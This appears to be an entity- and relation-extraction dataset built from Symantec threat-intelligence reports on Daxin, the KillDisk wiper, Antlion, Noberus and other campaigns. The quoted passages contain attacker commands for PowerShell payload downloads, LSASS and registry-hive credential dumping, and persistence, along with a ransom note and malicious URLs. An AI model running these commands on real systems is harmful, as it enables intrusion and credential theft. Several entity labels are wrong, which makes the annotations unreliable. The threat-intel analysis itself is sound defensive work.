{"instruction": "We believe that before commencing development of Daxin, the attackers were already experimenting for some time with the techniques that become part of Daxin. An older piece of malware \u2013 Backdoor.Zala (aka Exforel) \u2013 contained a number of common features but did not have many of Daxin\u2019s advanced capabilities. Daxin appears to build on Zala\u2019s networking techniques, reusing a significant amount of distinctive code and even sharing certain magic constants. This is in addition to a certain public library used to perform hooking that is also common between some variants of Daxin and Zala. The extensive sharing indicates that Daxin designers at least had access to Zala\u2019s codebase. We believe that both malware families were used by the same actor, which became active no later than 2009.", "input": null, "output": "Named Entities: (Daxin, malware), (Backdoor.Zala, malware), (Exforel, malware), (Zala, malware)\nRelationships: (Backdoor.Zala, aka, Exforel), (Daxin, build on, Backdoor.Zala), (Backdoor.Zala, same actor, Daxin)"}
{"instruction": "Links to known espionage actors There are several examples of attacks where tools known to be associated with Chinese espionage actors have been observed along with what we believe to be variants of Daxin. In a November 2019 attack against an information technology company, the attackers used a single PsExec session to first attempt to deploy Daxin before then resorting to Trojan.Owprox. Owprox is associated with the China-linked Slug (aka Owlproxy). In May 2020, malicious activity involving both Backdoor.Daxin and Trojan.Owprox occurred on a single computer belonging to another organizations, a technology company.", "input": null, "output": "Named Entities: (Chinese espionage actors, attacker), (Daxin, malware), (Trojan.Owprox, malware), (Owprox, attacker), (Slug, attacker), (Owlproxy, attacker), (Backdoor.Daxin, malware)\nRelationships: (Chinese espionage actors, associated with, Daxin), (Owprox, associated with, Slug), (Slug, aka, Owlproxy), (Backdoor.Daxin, occurred with, Trojan.Owprox)"}
{"instruction": "In a July 2020 attack against a military target, the attackers made two unsuccessful attempts to deploy a suspicious driver. When these attempts failed, the attackers resorted to different malware instead, a variant of Trojan.Emulov. Symantec did not obtain either of the two suspicious drivers used in this attack. However, very strong similarities between this attack and earlier activity in which Daxin was used suggests that it is highly likely the attackers attempted to deploy Daxin before falling back on the other malware.", "input": null, "output": "Named Entities: (Trojan.Emulov, malware), (Daxin, malware)\nRelationships: (Trojan.Emulov, variant of, Daxin)"}
{"instruction": "Developing analysis \nIn summary, Daxin includes some of the most complex features we have seen in a highly probable China-linked malware campaign. We will publish follow-up blogs over the coming days with more detailed technical analysis and other insights from our research and collaborations.", "input": null, "output": "No related entities and relations."}
{"instruction": "Ukraine: Disk-wiping Attacks Precede Russian Invasion", "input": null, "output": "No related entities and relations."}
{"instruction": "Destructive malware deployed against targets in Ukraine and other countries in the region in the hours prior to invasion. UPDATE February 24, 2022, 13:42 : This blog has been updated with details about ransomware being used as a possible decoy during some wiper attacks. UPDATE February 25, 2022, 17:00 : This blog has been updated with details on how a known Microsoft SQL Server vulnerability ( CVE-2021-1636 ) was exploited in at least one attack. A new form of disk-wiping malware (Trojan.Killdisk) was used to attack organizations in Ukraine shortly before the launch of a Russian invasion this morning (February 24). Symantec, a division of Broadcom Software , has also found evidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the financial, defense, aviation, and IT services sectors.", "input": null, "output": "Named Entities: (ransomware, threat type), (wiper attacks, threat type), (CVE-2021-1636, vulnerability), (Trojan.Killdisk, malware)\n\nRelationships: No related entities and relations."}
{"instruction": "Trojan.Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital Ltd. It contains 32-bit and 64-bit driver files which are compressed by the Lempel-Ziv algorithm stored in their resource section. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will drop the corresponding file according to the operating system (OS) version of the infected system. Driver file names are generated using the Process ID of the wiper Once run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable. The wiper does not appear to have any additional functionality beyond its destructive capabilities.", "input": null, "output": "Named Entities: (Trojan.Killdisk, malware)\n\nRelationships: No related entities and relations."}
{"instruction": "Attack chain Initial indications suggest that the attacks may have been in preparation for some time. Temporal evidence points to potentially related malicious activity beginning as early as November 2021. However, we are continuing to review and verify findings. In the case of an attack against one organization in Ukraine, the attackers appear to have gained access to the network on December 23, 2021, via malicious SMB activity against a Microsoft Exchange Server. This was immediately followed by credential theft. A web shell was also installed on January 16, before the wiper was deployed on February 23. An organization in Lithuania was compromised from at least November 12, 2021, onwards. It appears the attackers may have leveraged a Tomcat exploit in order to execute a PowerShell command. The decoded PowerShell was used to download a JPEG file from an internal server, on the victim\u2019s network.", "input": null, "output": "No related entities and relations."}
{"instruction": "cmd.exe /Q /c powershell -c \"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1')\" 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1 A minute later, the attackers created a scheduled task to execute a suspicious \u2018postgresql.exe\u2019 file, weekly on a Wednesday, specifically at 11:05 local-time. The attackers then ran this scheduled task to execute the task. cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1 schtasks /run /tn \"\\Microsoft\\Windows\\termsrv\\licensing\\TlsAccess\" Nine minutes later, the attackers modified the scheduled task to execute the same postgres.exe file at 09:30 local-time instead. Beginning on February 22, Symantec observed the file \u2018postgresql.exe\u2019 being executed and used to perform the following: Execute certutil to check connectivity to trustsecpro[.]com and whatismyip[.]com Execute a PowerShell command to download another JPEG file from a compromised web server - confluence[.]novus[.]ua Following this activity, PowerShell was used to dump credentials from the compromised machine: cmd.exe /Q /c powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1", "input": null, "output": "Named Entities: (cmd.exe, file), (powershell, tool), (hxxp://192.168.3.13/email.jpeg, URL), (postgresql.exe, file), (schtasks, tool), (CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1, file), (CSIDL_WINDOWS\\policydefinitions\\postgresql.exe, file), (trustsecpro[.]com, Domain), (whatismyip[.]com, Domain), (PowerShell, tool), (confluence[.]novus[.]ua, Domain)\n\nRelationships: (cmd.exe, execute, powershell), (powershell, download, hxxp://192.168.3.13/email.jpeg), (cmd.exe, move, CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1), (schtasks, modify, postgresql.exe), (schtasks, execute, postgresql.exe), (postgresql.exe, execute, certutil), (certutil, check connectivity to, trustsecpro[.]com), (certutil, check connectivity to, whatismyip[.]com), (certutil, download, confluence[.]novus[.]ua)"}
{"instruction": "Later, following the above activity, several unknown PowerShell scripts were executed. powershell -v 2 -exec bypass -File text.ps1 powershell -exec bypass gp.ps1 powershell -exec bypass -File link.ps1 Five minutes later, the wiper (Trojan.KillDisk) was deployed.", "input": null, "output": "Named Entities: (PowerShell script, tool), (text.ps1, file), (gp.ps1, file), (link.ps1, file), (Trojan.KillDisk, malware)\nRelationships: (PowerShell script, execute, text.ps1), (PowerShell script, execute, gp.ps1), (PowerShell script, execute, link.ps1), (PowerShell script, deploy, Trojan.KillDisk)"}
{"instruction": "SQL Server exploit \nThe attackers appear to have used an exploit of a known vulnerability in Microsoft SQL Server ( CVE-2021-1636 ) in order to compromise at least one of the targeted organisations. In an attack against an organization in Ukraine, the following process lineage was used to execute the \u201cwhoami\u201d command on November 11 2021: \nCSIDL_SYSTEM_DRIVE\\program files\\microsoft sql server\\mssql12.mssqlserver\\mssql\\binn\\sqlservr.exe,CSIDL_SYSTEM\\services.exe,CSIDL_SYSTEM\\wininit.exe \nThe next day, the same process lineage was responsible for executing the following PowerShell command: \n(New-Object System.Net.WebClient).DownloadFile('hxxp://[INTERNAL_HOST]/label.ico','C:\\temp\\sys.tmp1') \nThe organization was running an unpatched version of Microsoft SQL Server.", "input": null, "output": "Named Entities:(CVE-2021-1636, vulnerability), (sqlservr.exe, file), (CSIDL_SYSTEM\\services.exe, file), (CSIDL_SYSTEM\\wininit.exe, file), (PowerShell command, tool), (hxxp://[INTERNAL_HOST]/label.ico, URL), (C:\\temp\\sys.tmp1, file)\n\nRelationships: (sqlservr.exe, execute, CSIDL_SYSTEM\\services.exe), (CSIDL_SYSTEM\\services.exe, execute, CSIDL_SYSTEM\\wininit.exe), (CSIDL_SYSTEM\\wininit.exe, execute, PowerShell command), (PowerShell command, download, hxxp://[INTERNAL_HOST]/label.ico), (PowerShell command, save as, C:\\temp\\sys.tmp1)"}
{"instruction": "Ransomware decoy \nIn several attacks Symantec has investigated to date, ransomware was also deployed against affected organizations at the same time as the wiper. As with the wiper, scheduled tasks were used to deploy the ransomware. File names used by the ransomware included client.exe, cdir.exe, cname.exe, connh.exe, and intpub.exe.\u00a0 It appears likely that the ransomware was used as a decoy or distraction from the wiper attacks. This has some similarities to the earlier WhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware. \nFigure 1. Ransom note used in decoy ransomware", "input": null, "output": "Named Entities: (Ransomware, threat type), (wiper, threat type), (scheduled tasks, tool), (client.exe, file), (cdir.exe, file), (cname.exe, file), (connh.exe, file), (intpub.exe, file), (WhisperGate, malware)\n\nRelationships: (ransomware, include, client.exe), (ransomware, include, cdir.exe), (ransomware, include, cname.exe), (ransomware, include, connh.exe), (ransomware, include, intpub.exe), (wiper, disguised as, ransomware),"}
{"instruction": "Developing situation \nWith an invasion now underway, there remains a high likelihood of further cyber attacks against Ukraine and other countries in the region. Symantec\u2019s Threat Hunter Team will continue to actively monitor the situation and post updates to this blog if new information becomes available.", "input": null, "output": "No related entities and relations."}
{"instruction": "Antlion: Chinese APT Uses Custom Backdoor to Target Financial Institutions in Taiwan", "input": null, "output": "Named Entities: (Antlion, attacker), (Custom Backdoor, malware)\nRelationships: (Antlion, use, Custom Backdoor)"}
{"instruction": "The attackers spent a significant amount of time on victim networks. Chinese state-backed advanced persistent threat (APT) group Antlion has been targeting financial institutions in Taiwan in a persistent campaign over the course of at least 18 months. The attackers deployed a custom backdoor we have called xPack on compromised systems, which gave them extensive access to victim machines. The backdoor allowed the attackers to run WMI commands remotely, while there is also evidence that they leveraged EternalBlue exploits in the backdoor. The attackers appeared to have the ability to interact with SMB shares, and it's possible that they used mounted shares over SMB to transfer files from attacker-controlled infrastructure. There is also evidence that the attackers were able to browse the web through the backdoor, likely using it as a proxy to mask their IP address.", "input": null, "output": "Named Entities: (Antlion, attacker), (xPack, malware)\nRelationships: (Antlion, deploy, xPack)"}
{"instruction": "The goal of this campaign appears to have been espionage, as we saw the attackers exfiltrating data and staging data for exfiltration from infected networks.", "input": null, "output": "No related entities and relations."}
{"instruction": "Technical details As well as the attack on the financial institution outlined in the case study below , Antlion compromised the networks of at least two other organizations in Taiwan, including another financial organization and a manufacturing company. The activity the group carried out on those networks was largely similar to the activity that is detailed in the case study, with the xPack backdoor frequently deployed and a lot of evidence of credential dumping. In the manufacturing target, also, we see the attackers attempting to download malicious files via SMB shares. The attackers also spent a significant amount of time on both these targeted networks, spending close to 250 days on the financial organization and around 175 days on the manufacturing organization.", "input": null, "output": "Named Entities: (Antlion, attacker),(xPack backdoor, malware)\nRelationships: (Antlion, deploy, xPack backdoor)"}
{"instruction": "Noberus then runs commands to collect system information via WMIC, in order to collect Universally Unique Identifiers (UUIDs) from each machine. These are then used to generate the \u2018access token\u2019 that makes up part of the unique Tor address victims are instructed to visit. Navigate to: http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion/?access-key=${ACCESS_KEY}\" We also saw a fsutil command being executed by Noberus. Fsutil performs tasks that are related to file allocation table (FAT) and NTFS file systems. In this incident, the attacker is specifically modifying the SymLink Evaluation behavior to modify the type of symbolic links that can be created on the system. Symbolic links create a file in your directory that acts as a shortcut to another file or folder. cmd /c fsutil behavior set SymlinkEvaluation R2L:1 cmd /c fsutil behavior set SymlinkEvaluation R2R:1", "input": null, "output": "Named Entities: (Noberus, malware), (Tor address, tool), (http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion/?access-key=${ACCESS_KEY}, URL), (cmd.exe, file)\n\nRelationships: (Noberus, generate, Tor address), (Tor address, visit, http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion/?access-key=${ACCESS_KEY})"}
{"instruction": "In order to recover your files you need to follow instructions below. >> Sensitive Data Sensitive data on your system was DOWNLOADED and it will be PUBLISHED if you refuse to cooperate. Data includes: - Employees personal data, CVs, DL, SSN. - Complete network map including credentials for local and remote services. - Financial information including clients\u2019 data, bills, budgets, annual reports, bank statements. - Complete datagrams/schemas/drawings for manufacturing in solidworks format - And more... Private preview is published here: http://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd[.]onion/[REDACTED] >> CAUTION DO NOT MODIFY FILES YOURSELF. DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA. YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS. YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY. >> Recovery procedure Follow these simple steps to get in touch and recover your data: 1) Download and install Tor Browser from: https://torproject.org/ 2) Navigate to: http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd[.]onion/?access-key=[REDACTED]", "input": null, "output": "Named Entities: (http://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd[.]onion/[REDACTED], URL), (Tor Browser, tool), (https://torproject.org/, URL), (http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd[.]onion/?access-key=[REDACTED], URL)\n\nRelationships: No related entities and relations."}
{"instruction": "locale- SmallLogo VisualElements adobe_sign Adobe Sign core_icons A fourth variant contained updated SFTP server details: Host: 159.89.128.13 Port: 22 The WebDav client used the following updated URL: https://159.89.128.13/data/ Finally, the list of files for inclusion was updated by removing \u201c.png\u201d.", "input": null, "output": "Named Entities: (SFTP server, tool), (WebDav client, tool), (159.89.128.13, IP), (https://159.89.128.13/data/, URL)\nRelationships: (SFTP server, IP, 159.89.128.13), (WebDav client, URL, https://159.89.128.13/data/)"}
{"instruction": "Attack chain for recent activity We did not observe what the initial infection vector was in this campaign, but it was likely a malicious URL spread via either spam email campaigns or through malvertising, which is typically the first step in Latin American banking Trojan campaigns. Victims are then directed to one of the following malicious URLs: hxxps://centreldaconsulta[.]com/ hxxps://www.centralcfconsulta[.]net/ hxxps://centralcfconsulta[.]net/index3.php?api=vFUMIfUzGz2QdjxTFKAMyTlh hxxps://centralcfconsulta.net/ hxxps://www.centralcfconsulta[.]net/index3.php?api=r0ubnHRxDycEy5uFPViNA55Y3t hxxps://www.centralcfconsulta[.]net/index3.php?api=4DQSbdp3hLqPRGTbOGtl7jCD9FKNViKXmKd9Lv hxxps://centreldaconsulta[.]com/index3.php?api=nJsdr1J3h0fsG18sRAVQt6JjVW hxxps://centreldaconsulta[.]com/index3.php?api=ThMyMCAQEOLIC9nO hxxps://www.centralcfconsulta[.]net/index3.php?api=wen1eIFCeUh0jAS3mWIDUhSLt3sXMQ Victims are then redirected to an Amazon Web Services (AWS) URL, which it appears the attackers abused to use as a command-and-control (C&C) server. A ZIP file that contains a Microsoft Software Installer (MSI) file is downloaded from the AWS infrastructure. ESET reported that most gangs deploying banking Trojans in Latin America had started using MSI files as an initial download in 2019. An MSI file can be used to install, uninstall, and update applications running on Windows systems.", "input": null, "output": "Named Entities: (Latin American banking Trojan, malware), (hxxps://centreldaconsulta[.]com/, URL), (hxxps://www.centralcfconsulta[.]net/, URL), (hxxps://centralcfconsulta[.]net/index3.php?api=vFUMIfUzGz2QdjxTFKAMyTlh, URL), (hxxps://centralcfconsulta.net/, URL), (hxxps://www.centralcfconsulta[.]net/index3.php?api=r0ubnHRxDycEy5uFPViNA55Y3t, URL), (hxxps://www.centralcfconsulta[.]net/index3.php?api=4DQSbdp3hLqPRGTbOGtl7jCD9FKNViKXmKd9Lv, URL), (hxxps://centreldaconsulta[.]com/index3.php?api=nJsdr1J3h0fsG18sRAVQt6JjVW, URL), (hxxps://centreldaconsulta[.]com/index3.php?api=ThMyMCAQEOLIC9nO, URL), (hxxps://www.centralcfconsulta[.]net/index3.php?api=wen1eIFCeUh0jAS3mWIDUhSLt3sXMQ, URL), (ESET, tool)\nRelationships: (Latin American banking Trojan, directed to, hxxps://centreldaconsulta[.]com/), (Latin American banking Trojan, directed to, hxxps://www.centralcfconsulta[.]net/), (Latin American banking Trojan, directed to, hxxps://centralcfconsulta[.]net/index3.php?api=vFUMIfUzGz2QdjxTFKAMyTlh), (Latin American banking Trojan, directed to, hxxps://centralcfconsulta.net/), (Latin American banking Trojan, directed to, hxxps://www.centralcfconsulta[.]net/index3.php?api=r0ubnHRxDycEy5uFPViNA55Y3t), (Latin American banking Trojan, directed to,hxxps://www.centralcfconsulta[.]net/index3.php?api=4DQSbdp3hLqPRGTbOGtl7jCD9FKNViKXmKd9Lv), (Latin American banking Trojan, directed to, hxxps://centreldaconsulta[.]com/index3.php?api=nJsdr1J3h0fsG18sRAVQt6JjVW), (Latin American banking Trojan, directed to, hxxps://centreldaconsulta[.]com/index3.php?api=ThMyMCAQEOLIC9nO), (Latin American banking Trojan, directed to, hxxps://www.centralcfconsulta[.]net/index3.php?api=wen1eIFCeUh0jAS3mWIDUhSLt3sXMQ)"}
{"instruction": "If the victim double-clicks the MSI file inside the downloaded ZIP, it will execute msiexec.exe, which then connects to a secondary C&C server to download another ZIP file containing the payload (mpr.dll), along with other legitimate portable executable (PE) files. The URLs observed being accessed by msiexec.exe included: hxxp://13.36.240[.]208/ando998.002 hxxp://13.36.240[.]208/msftq.doge hxxp://15.237.60[.]133/esperanca.lig2 hxxp://15.237.60[.]133/esperanca.liga hxxp://52.47.163[.]237/microsft.crts hxxp://52.47.163[.]237/nanananao.uooo hxxp://15.237.27[.]77/carindodone.ways The extracted ZIP file contains a renamed legitimate Oracle application - VBoxTray.exe. This is executed to load the payload (mpr.dll) by way of DLL search-order hijacking. DLL search-order hijacking takes advantage of how Windows handles DLLs to allow an attacker to load malicious code into a legitimate process. The mpr.dll file is also bigger than 100 MB in order to evade submission to security services, which tend not to process files above that size. Both of these files and this exact same process were observed in the banking Trojan activity detailed in ESET\u2019s report.", "input": null, "output": "Named Entities: (msiexec.exe, file), (mpr.dll, file), (VBoxTray.exe, file), (hxxp://13.36.240[.]208/ando998.002, URL), (hxxp://13.36.240[.]208/msftq.doge, URL), (hxxp://15.237.60[.]133/esperanca.lig2, URL), (hxxp://15.237.60[.]133/esperanca.liga, URL), (hxxp://52.47.163[.]237/microsft.crts, URL), (hxxp://52.47.163[.]237/nanananao.uooo, URL), (hxxp://15.237.27[.]77/carindodone.ways, URL), (VBoxTray.exe, file)\n\nRelationships: (MSI file, execute, msiexec.exe), (msiexec.exe, connect, C&C server), (msiexec.exe, download, mpr.dll), (msiexec.exe, access, hxxp://13.36.240[.]208/ando998.002), (msiexec.exe, access, hxxp://13.36.240[.]208/msftq.doge), (msiexec.exe, access, hxxp://15.237.60[.]133/esperanca.lig2), (msiexec.exe, access, hxxp://15.237.60[.]133/esperanca.liga), (msiexec.exe, access, hxxp://52.47.163[.]237/microsft.crts), (msiexec.exe, access, hxxp://52.47.163[.]237/nanananao.uooo), (msiexec.exe, access, hxxp://15.237.27[.]77/carindodone.ways), (mpr.dll, load, VBoxTray.exe)"}
{"instruction": "Persistence is then created for the renamed VBoxTray.exe so that mpr.dll is always side-loaded into it by way of either Windows Registry or Windows Management Instrumentation (WMI). This is another common technique used in the attack chain for Latin American banking Trojans.", "input": null, "output": "Named Entities: (VBoxTray.exe, file), (mpr.dll, file), (Latin American banking Trojans, malware)\nRelationships: (Latin American banking Trojans,, created for, VBoxTray.exe), (VBoxTray.exe, side-loaded with, mpr.dll)"}
{"instruction": "Symantec, a division of Broadcom, cannot state with certainty what the initial infection vector used by the attackers in this campaign was, though in one instance they were seen utilizing the MSSQL service to execute system commands, which indicates that the most likely infection vector was exploitation of a web application or service. However, Antlion are also known to have previously used malicious emails to gain initial access to victim networks.", "input": null, "output": "Named Entities: (Antlion, attacker)\nRelationships: No related relations."}
{"instruction": "The main custom backdoor used by Antlion in this campaign was the xPack backdoor, which is a custom .NET loader that decrypts (AES), loads, and executes accompanying .bin files. Its decryption password is provided as a command-line argument (Base64 encoded string), and xPack is intended to be run as a standalone application or as a service (xPackSvc variant). The xPack malware and its associated payload seems to be used for initial access; it appears that xPack was predominantly used to execute system commands, drop subsequent malware and tools, and stage data for exfiltration. The attackers also used a custom keylogger and three custom loaders. EHAGBPSL loader - custom loader written in C++ - loaded by JpgRun loader JpgRun loader - customer loader written in C++ - similar to xPack, reads the decryption key and filename from the command line - decodes the file and executes it", "input": null, "output": "Named Entities: (Antlion, attacker), (xPack backdoor, malware), (EHAGBPSL loader, tool), (JpgRun loader, tool), (custom keylogger, tool)\nRelationships: (Antlion, use, xPack backdoor), (Antlion, use, EHAGBPSL loader), (EHAGBPSL loader, loaded by, JpgRun loader), (JpgRun loader, similar to, xPack backdoor)"}
{"instruction": "CheckID - custom loader written in C++ - based on loader used by BlackHole RAT The attackers also used a custom SMB session enumeration tool (NetSessionEnum), a custom bind/reverse file transfer tool named ENCODE MMC, and a Kerberos golden ticket tool based on Mimikatz. The attackers also used a variety of off-the-shelf tools, as well as leveraging living-off-the-land tools such as PowerShell, WMIC, ProcDump, LSASS, and PsExec. The legitimate AnyDesk tool was also abused by the attackers for remote access in one of the victim organizations. The attackers were also observed leveraging exploits such as CVE-2019-1458 for privilege escalation and remote scheduled tasks to execute their backdoor. CVE-2019-1458 is an elevation-of-privilege vulnerability that occurs in Windows when the Win32k component fails to properly handle objects in memory.", "input": null, "output": "Named Entities: (CheckID, tool), (custom loader, tool), (BlackHole RAT, malware), (PowerShell, tool), (WMIC, tool), (ProcDump, tool), (LSASS, tool), (PsExec, tool), (AnyDesk tool, tool), (CVE-2019-1458, vulnerability)\nRelationships: (CheckID, based on, BlackHole RAT), (CheckID, leverage, PowerShell), (CheckID, leverage, WMIC), (CheckID, leverage, ProcDump), (CheckID, leverage, LSASS), (CheckID, leverage, PsExec), (CheckID, abuse, AnyDesk tool), (CheckID, exploit, CVE-2019-1458)"}
{"instruction": "Legitimate versions of WinRAR appear to have been exploited by the attackers for data exfiltration, while there is also evidence of data exfiltration via PowerShell, specifically using the BitsTransfer module to initiate an upload to attacker-controlled infrastructure. There is also evidence that the attackers likely automated the data collection process via batch scripts, while there is also evidence of instances where data was likely staged for further exfiltration, though it was not actually observed being exfiltrated from the network. In these instances, it appears the attackers were interested in collecting information from software pertaining to business contacts, investments, and smart card readers.", "input": null, "output": "Named Entities: (WinRAR, tool), (PowerShell, tool)\nRelationships: No related relations."}
{"instruction": "Case study: Attack on a financial organization The attackers spent a significant amount of time on victims\u2019 networks, and deployed both custom and off-the-shelf malware. In one financial sector victim in Taiwan the attackers spent almost nine months on the victim network. The first suspicious activity on this victim network occurred in December 2020 when WMIC was used to execute two commands: wmic process get CSName,Description,ExecutablePath,ProcessId /format:\u201d;CSIDL_SYSTEM\\wbem\\zh-tw\\htable.xsl\u201d; wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:\u201d;CSIDL_SYSTEM\\wbem\\zh-tw\\htable.xsl\u201d; The first command was used to list the computer name, description of processes, executable path, and process ID. The output was written to a suspicious file named htable.xsl under the wbem directory. The second command was used to collect information about the system, which was written out to the same file (htable.xsl). Information collected included: Version of the operating system (OS) The installation date The last time the system was booted", "input": null, "output": "Named Entities: (WMIC, tool), (htable.xsl, file)\nRelationships: No related relations."}
{"instruction": "The local date and time of the system The manufacturer The registered user Service pack information - this can be used to determine what patches are installed System directory path Five minutes after those commands were issued, WMIC was used to dump credentials: reg save HKLM\\SAM CSIDL_COMMON_DOCUMENTS\\sam.hiv reg save HKLM\\SYSTEM CSIDL_COMMON_DOCUMENTS\\sys.hiv reg save hklm\\security CSIDL_COMMON_DOCUMENTS\\security.hiv The commands listed above were all executed via Antlion\u2019s custom xPack backdoor. Several days later, during the Christmas holiday period, the attackers returned over a period of a few days and executed the xPack backdoor again. They also executed an unknown VBS script via PsExec multiple times: \u201c;cscript.exe\u201d; CSIDL_SYSTEM_DRIVE\\update.vbs On December 28, the attackers used xPack to launch a command prompt to dump credentials from several machines within the compromised organization with the following commands: upload.exe -accepteula -ma lsass.exe 16.dmp (a renamed version of Sysinternals procdump64.exe) reg save hklm\\sam CSIDL_PROFILE\\publicsam.hive reg save hklm\\system CSIDL_PROFILE\\public\\system.hive", "input": null, "output": "Named Entities: (WMIC, tool), (Antlion, malware), (xPack backdoor, malware), (VBS script, tool), (PsExec, tool), (Sysinternals procdump64.exe, file)\nRelationships: (Antlion, use, xPack backdoor), (xPack backdoor, execute, VBS script), (xPack backdoor, execute, PsExec)"}
{"instruction": "reg save hklm\\security CSIDL_PROFILE\\public\\security.hive Over the following couple of weeks, the attackers continued to return intermittently to launch the xPack backdoor or to dump credentials via the registry. Then, following a few weeks of inactivity, they become active on the infected network once again. The attackers used the xPack backdoor to launch a command prompt to execute the following commands: \u201c;cmd\u201d; /K CHCP 950 CHCP 950 query user \u201c;CSIDL_SYSTEM\\quser.exe\u201d; tasklist /v findstr explorer cmd /c dir \u201c;CSIDL_PROFILE\\desktop\u201d; CSIDL_SYSTEM\\cmd.exe /c cmd /c dir \\users /b cmd /c dir \u201c;CSIDL_PROFILE\\desktop\u201d; cmd /c dir \\users /b reg save hklm\\security CSIDL_COMMON_DOCUMENTS\\security.hiv rar a -r [email protected] [email protected] # W22-009-099.tmp \u201c;CSIDL_COMMON_DOCUMENTS\\w22-009-099_file\u201d; reg save hklm\\system CSIDL_COMMON_DOCUMENTS\\system.hiv reg save hklm\\sam CSIDL_COMMON_DOCUMENTS\\sam.hiv", "input": null, "output": "Named Entities: (xPack backdoor, malware), (CSIDL_PROFILE\\public\\security.hive, file), (CSIDL_SYSTEM\\quser.exe, file), (CSIDL_COMMON_DOCUMENTS\\security.hiv, file), (CSIDL_COMMON_DOCUMENTS\\system.hiv, file), (CSIDL_COMMON_DOCUMENTS\\sam.hiv, file)\nRelationships: No related relations."}
{"instruction": "The above commands were used to firstly change the code page to 950, which is the Windows code page for Traditional Chinese. The attackers then executed 'query user' to list any logged-in users on the system, as well as running \u2018tasklist\u2019 to get a list of all the running processes on the system. They also tried to discover what processes were running, before listing all contents of the Desktop directory and the Users directory. After this, the attackers dumped credentials again via the registry.", "input": null, "output": "No related entities and relations."}
{"instruction": "The attackers returned to the network a couple of weeks later and carried out largely the same activity. The attackers remained active on the network for March, April, and May 2021, intermittently returning to launch their xPack backdoor or dump credentials from the registry. Dumping credentials appears to be a main focus of the attackers, with them likely using these credentials to move laterally across the network to identify machines of interest from which they can exfiltrate data. The last activity on this network, after a gap of three months, occurred in August 2021, when the attackers returned and listed all available shares. They then dumped credentials from the registry and proceeded to collect account, group, and workstation configuration information. They then dumped credentials from the registry once again. This was the last activity seen on this network.", "input": null, "output": "Named Entities: (attackers, attacker), (xPack backdoor, tool)\nRelationships: \uff08attacker, launch, xPack backdoor)"}
{"instruction": "Experienced actor stays active \nAntlion is believed to have been involved in espionage activities since at least 2011, and this recent activity shows that it is still an actor to be aware of more than 10 years after it first appeared. \nThe length of time that Antlion was able to spend on victim networks is notable, with the group able to spend several months on victim networks, affording plenty of time to seek out and exfiltrate potentially sensitive information from infected organizations. The targeting of Taiwan is perhaps unsurprising given we know Chinese state-backed groups tend to be interested in organizations in that region.", "input": null, "output": "Named Entities: (Antlion, attacker), (espionage activities, threat type), (Chinese state-backed groups, attacker)\nRelationships: (Antlion, involved in, espionage activities)"}
{"instruction": "Shuckworm Continues Cyber-Espionage Attacks Against Ukraine", "input": null, "output": "Named Entities: (Shuckworm, malware)\nRelationships: No related relations."}
{"instruction": "Symantec investigation uncovers selection of files used in ongoing attacks. The Russia-linked Shuckworm group (aka Gamaredon, Armageddon) is continuing to conduct cyber-espionage attacks against targets in Ukraine. Over the course of recent months, Symantec\u2019s Threat Hunter Team, a part of Broadcom Software , has found evidence of attempted attacks against a number of organizations in the country.", "input": null, "output": "Named Entities: (Shuckworm group, attacker), (Gamaredon, attacker), (Armageddon, attacker), (cyber-espionage attacks, threat type)\nRelationships: (Shuckworm group, aka, Gamaredon), (Shuckworm group, aka, Armageddon), (Shuckworm group, conduct, cyber-espionage attacks)"}
{"instruction": "Active since at least 2013, Shuckworm specializes in cyber-espionage campaigns mainly against entities in Ukraine. The group is known to use phishing emails to distribute either freely available remote access tools, including Remote Manipulator System (RMS) and UltraVNC, or customized malware called Pterodo/Pteranodon to targets. A recent report published by The Security Service of Ukraine (SSU) noted that Shuckworm\u2019s attacks have grown in sophistication in recent times, with attackers now using living-off-the-land tools to steal credentials and move laterally on victim networks. Recent activity seen by Symantec is consistent with that documented by SSU.", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Remote Manipulator System (RMS), tool), (UltraVNC, tool), (Pterodo/Pteranodon, malware)\nRelationships: (Shuckworm, specialize in, cyber-espionage campaigns), (Shuckworm, distribute, UltraVNC), (Shuckworm, distribute, Pterodo/Pteranodon)"}
